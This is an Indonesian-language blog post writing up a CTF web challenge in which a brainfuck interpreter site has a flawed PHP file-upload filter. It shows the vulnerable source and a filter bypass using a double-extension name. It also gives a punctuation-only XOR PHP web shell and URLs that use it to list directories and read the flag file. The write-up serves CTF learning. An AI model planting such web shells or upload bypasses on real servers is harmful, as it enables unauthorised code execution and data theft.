<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="cacadosman">
<meta name="description"
    content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
&amp;lt;?php if (isset($_GET[&amp;quot;debug&amp;quot;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) { throw new Exception(&#39;Bukan file terupload&#39;); } if ($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 500) { throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;); } // harusnya cuma boleh &amp;gt;&amp;lt;&#43;-[]." />
<meta name="keywords" content="tutorial, computer, computer science, programming, php, html, python, js, javascript" />
<meta name="robots" content="noodp" />
<meta name="google-site-verification" content="-h6YUy6TfirY69dSHiwzAi_kGF5T9QeAID4fX8aazpc" />
<meta property="og:image" content="main3.jpg">
<link rel="canonical" href="/2019/02/10/writeup-ctf-brainduck-final-arkavidia-5-0/" />


<title>
    
    Writeup CTF Brainduck Final Arkavidia 5.0 :: Infinite Overflow  — Sebuah Coretan Tak Bermakna
    
</title>



<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Source+Code+Pro" rel="stylesheet"
    type="text/css">
<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">


<link rel="stylesheet" href="/scss/main.min.d3f9aeb956e8804b6cf26fc1cec66bc5b2937561cfc468e6e6f9244b88ad4bc9.css">


<style>
    .img-main {
        display: block;
        margin-left: auto;
        margin-right: auto;
        width: 200px;
        height: auto;
        max-height: 200px;
        border-radius: 50%;
    }
</style>




<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627">
<meta itemprop="name" content="Writeup CTF Brainduck Final Arkavidia 5.0">
<meta itemprop="description" content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
&lt;?php if (isset($_GET[&quot;debug&quot;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) { throw new Exception(&#39;Bukan file terupload&#39;); } if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) { throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;); } // harusnya cuma boleh &gt;&lt;&#43;-[].">


<meta itemprop="datePublished" content="2019-02-10T02:46:54&#43;00:00" />
<meta itemprop="dateModified" content="2019-02-10T02:46:54&#43;00:00" />
<meta itemprop="wordCount" content="525">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="Writeup CTF Brainduck Final Arkavidia 5.0"/>
<meta name="twitter:description" content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
&lt;?php if (isset($_GET[&quot;debug&quot;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) { throw new Exception(&#39;Bukan file terupload&#39;); } if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) { throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;); } // harusnya cuma boleh &gt;&lt;&#43;-[]."/>



<meta property="article:section" content="CTF" />
<meta property="article:section" content="Cyber Security" />

<meta property="article:published_time" content="2019-02-10 02:46:54 &#43;0000 &#43;0000" />








    </head>

    <body class="">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">Infinite Overflow</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/chat">Chatbox</a></li><li><a href="/posts">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/2019/02/10/writeup-ctf-brainduck-final-arkavidia-5-0/">Writeup CTF Brainduck Final Arkavidia 5.0</a></h2>

            

            <div class="post-content">
                <p>Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.</p>

<p><img src="/wp-content/2019/02/bd.png" alt="" /></p>

<p>Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.</p>

<p>Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:</p>

<pre><code class="language-php">&lt;?php

  if (isset($_GET[&quot;debug&quot;])) {
    highlight_file(__FILE__);
    die();
  }

  function processUpload() {
    if (!is_uploaded_file($_FILES['file']['tmp_name'])) {
      throw new Exception('Bukan file terupload');
    }

    if ($_FILES['file']['size'] &gt; 500) {
      throw new Exception('Ukuran file tidak boleh melebihi 500 bytes');
    }

    // harusnya cuma boleh &gt;&lt;+-[].,
    // tapi ya sudah lah ¯\_(ツ)_/¯
    $content = file_get_contents($_FILES['file']['tmp_name']);
    if (!ctype_punct(preg_replace('/\s+/', '', $content))) {
      throw new Exception('Isi file hanya boleh ada karakter tanda baca dan whitespace');
    }

    $name = $_FILES['file']['name'];
    $name = substr($name, 0, 50);
    $name = preg_replace('/[^a-zA-Z0-9_\.]/', '', $name);

    // bibit unggul dilarang ngehack
    $blacklist = array('.php', '.php3', '.php4', '.php5', '.php7');
    $name = str_ireplace($blacklist, '', $name);

    $rand = bin2hex(random_bytes(20));
    $file = &quot;uploads/$rand-$name&quot;;
    if (!move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
      throw new Exception('Gagal upload file');
    }
    return $file;
  }

  $file = null;
  $output = null;
  $error = null;

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // https://github.com/dotzero/brainfuck-php/blob/master/src/Brainfuck.php
    require 'brainduck.php';
    try {
      $file = processUpload();
      $brainduck = new Brainduck(file_get_contents($file), 'Brainduck', true);
      $output = $brainduck-&gt;run(true);
    } catch (Exception $e) {
      $error = $e-&gt;getMessage();
    }
  }
?&gt;
&lt;!-- /?debug=V --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;

    &lt;title&gt;Brainduck&lt;/title&gt;

    &lt;link href=&quot;vendor/bootstrap/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
  &lt;/head&gt;

  &lt;body&gt;
    &lt;div class=&quot;container-fluid&quot;&gt;

&lt;?php if($error): ?&gt;
      &lt;div class=&quot;alert alert-danger&quot;&gt;
        &lt;?php echo htmlspecialchars($error); ?&gt;
      &lt;/div&gt;
&lt;?php elseif($file): ?&gt;
      &lt;div class=&quot;alert alert-success&quot;&gt;
        File sukses terupload. &lt;a href=&quot;&lt;?php echo htmlspecialchars($file); ?&gt;&quot;&gt;Download&lt;/a&gt;
      &lt;/div&gt;
&lt;?php endif; ?&gt;

&lt;?php if($output !== null): ?&gt;
&lt;?php if($output === &quot;&quot;): ?&gt;
        &lt;div class=&quot;card-header alert alert-danger&quot;&gt;
          Tidak ada output atau terjadi error
        &lt;/div&gt;
&lt;?php else: ?&gt;
      &lt;div class=&quot;card mb-3&quot;&gt;
        &lt;div class=&quot;card-header alert alert-success&quot;&gt;
          Output
        &lt;/div&gt;
        &lt;div class=&quot;card-body&quot;&gt;
          &lt;code&gt;&lt;?php echo htmlspecialchars($output); ?&gt;&lt;/code&gt;
        &lt;/div&gt;
      &lt;/div&gt;
&lt;?php endif; ?&gt;
&lt;?php endif; ?&gt;

      &lt;div class=&quot;card mb-3&quot;&gt;
        &lt;div class=&quot;card-header&quot;&gt;
          Upload file Brainduck
        &lt;/div&gt;
        &lt;div class=&quot;card-body&quot;&gt;
          Contoh:
          &lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;examples/hello_world.bf&quot;&gt;Hello World!&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;examples/squares.bf&quot;&gt;Bilangan Kuadrat&lt;/a&gt;&lt;/li&gt;
          &lt;/ul&gt;
          &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
            &lt;input type=&quot;file&quot; name=&quot;file&quot; required&gt;
            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Upload&lt;/button&gt;
          &lt;/form&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>

<p>Loh kok upload file?
1. Karena bisa didownload/diakses
2. Filter ekstensi hanya str_ireplace yang bisa diakali
3. Tetap dapat menginputkan punctuation characters (tidak hanya + - &gt; &lt; . ,)</p>

<p>Bagaimana cara mengakali str_ireplace?
Dengan cara merubah ekstensi menjadi namafile.ph.phpp, sehingga akan menjadi namafile.php karena .php akan difilter/dihilangkan</p>

<p>Lalu bagaimana kita memasukkan shell yang hanya punctuation character saja ?
Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bisa melakukan String XOR.</p>

<p>Kita akan melakukan XOR string &ldquo;<strong>`{{{</strong>&rdquo; dengan string &ldquo;<strong>?&lt;&gt;/</strong>&rdquo; yang dimana empat karakter tersebut jika diXOR akan menghasilkan _GET</p>

<p>Lalu kita tinggal merangkainya menjadi sebuah shell:</p>

<pre><code class="language-php">&lt;?=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__](${$_}[___]));
</code></pre>

<p>lalu simpan dengan nama shell.ph.phpp dan langsung saja kita upload.</p>

<p>Akhirnya kita bisa melakukan akses shell dengan mengakses alamat berikut:</p>

<blockquote>http://3.1.8.39:10002/uploads/blablabla123-shell.php?_=print_r&__=scandir&___=..</blockquote>

<p>(untuk melakukan listing directory, dengan catatan passthru, shell_exec, dan exec ternyata didisable)</p>

<p>Setelah mengetahui flag terdapat pada ../flag.php maka langsung saja kita akses.</p>

<blockquote>http://3.1.8.39:10002/blablabla123-shell.php?_=print_r&__=file_get_contents&___=../flag.php</blockquote>

<p>Maka kita akan mendapatkan flagnya, terima kasih :)</p>

<p><img src="/wp-content/2019/02/DxNXdIMUcAApNV0.jpg" alt="" /></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
  			</div>

        
          <div id="comments" class="thin">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "infinite-overflow" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2019</span>
            
            <span>cacadosman</span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        





<script type="text/javascript" src="/js/bundle.39e9a47febcec1a326d3c4a9b36fc4401073cb0b91b97aad920bbb5456da655960cb5c5cc3f1a0a82c27e21d4113ad35f884c26bfd76350814cb0551eb9797b9.js" integrity="sha512-Oemkf&#43;vOwaMm08Sps2/EQBBzywuRuXqtkgu7VFbaZVlgy1xcw/GgqCwn4h1BE601&#43;ITCa/12NQgUywVR65eXuQ=="></script>



    </body>
</html>
